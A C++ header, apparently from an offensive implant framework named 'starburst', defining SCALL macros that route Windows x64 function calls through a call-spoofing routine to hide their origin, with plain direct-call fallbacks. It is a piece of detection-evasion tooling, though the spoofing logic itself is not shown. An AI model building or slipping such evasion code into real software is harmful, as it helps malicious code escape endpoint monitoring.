#ifndef STARBURST_EVASION_SPOOF_DISPATCH_H
#define STARBURST_EVASION_SPOOF_DISPATCH_H

#include <module.h>

#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)

namespace starburst {

template<typename... Args>
__attribute__((always_inline)) inline auto declfn _scall_dispatch(
    instance& inst, PVOID fn, Args... args
) -> ULONG_PTR {
    FUNCTION_CALL call = {};
    call.ptr  = fn;
    call.argc = static_cast<int>( sizeof...( Args ) );
    int i = 0;
    ( ( call.args[i++] = (ULONG_PTR)( args ) ), ... );
    using _spoof_fn_t = ULONG_PTR(*)(instance&, FUNCTION_CALL*);
    return reinterpret_cast<_spoof_fn_t>( inst.evasion.spoof.call_fn )( inst, &call );
}

} // namespace starburst

#define SCALL(inst, fn, ...) \
    starburst::_scall_dispatch( (inst), (PVOID)( (inst).fn ), ##__VA_ARGS__ )

#define SCALL_PTR(inst, fn_ptr, ...) \
    starburst::_scall_dispatch( (inst), (PVOID)( fn_ptr ), ##__VA_ARGS__ )

#else

#define SCALL(inst, fn, ...) ((ULONG_PTR)( (inst).fn( __VA_ARGS__ ) ))

#define SCALL_PTR(inst, fn_ptr, ...) ((ULONG_PTR)( (fn_ptr)( __VA_ARGS__ ) ))

#endif

#endif // STARBURST_EVASION_SPOOF_DISPATCH_H
